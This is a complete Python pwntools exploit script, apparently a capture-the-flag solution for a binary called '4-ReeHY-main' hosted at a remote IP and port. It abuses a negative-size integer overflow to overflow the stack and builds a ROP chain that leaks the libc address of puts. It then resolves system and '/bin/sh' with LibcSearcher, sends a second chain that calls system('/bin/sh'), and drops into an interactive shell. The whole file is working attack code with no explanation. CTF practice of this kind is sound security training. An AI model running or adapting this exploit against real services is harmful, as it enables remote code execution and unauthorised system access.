#! /usr/bin/env python 
from pwn import * 
from LibcSearcher import * 
context(log_level='debug') 
local=0
if local: 
    p=process('./4-ReeHY-main') 
else: 
    p=remote('111.200.241.244',62321) 
elf=ELF('./4-ReeHY-main') 

#obj=LibcSearcher('puts',0x7fad94a5b690) 
#libc=ELF('./ctflibc.so.6') 
puts_got=elf.got['puts'] 
puts_plt=elf.plt['puts'] 
atoi_got=elf.got['atoi'] 
def new(size,cun,content): 
    p.recvuntil('$ ') 
    p.sendline('1') 
    p.recvuntil('Input size\n') 
    p.sendline(str(size)) 
    p.recvuntil('Input cun\n') 
    p.sendline(str(cun)) 
    p.recvuntil('Input content\n') 
    p.sendline(content)
#stack,int_overflow
prdi=0x400da3
main=0x400c8c
p.recvuntil('Input your name: \n')
p.sendlineafter('$ ','aaa')
new(-1,1,'a'*0x88+'\x00'*0x8+'a'*0x8+p64(prdi)+p64(puts_got)+p64(puts_plt)+p64(main))
#p.recv()
puts_add=u64(p.recvuntil('\n')[:6].ljust(8,'\x00'))
print hex(puts_add)
obj=LibcSearcher('puts',puts_add)
offset=puts_add-obj.dump('puts')
print('libc_base:',hex(offset))
#system=libc.symbols['system']
#sh=libc.search('/bin/sh').next()
system=obj.dump('system')+offset
sh=obj.dump('str_bin_sh')+offset
#p.recvuntil('Input your name: \n')
p.sendlineafter('$ ','aaa')
new(-1,1,'a'*0x88+'\x00'*0x8+'a'*0x8+p64(prdi)+p64(sh)+p64(system)+p64(main))
#p.recv()
p.interactive()

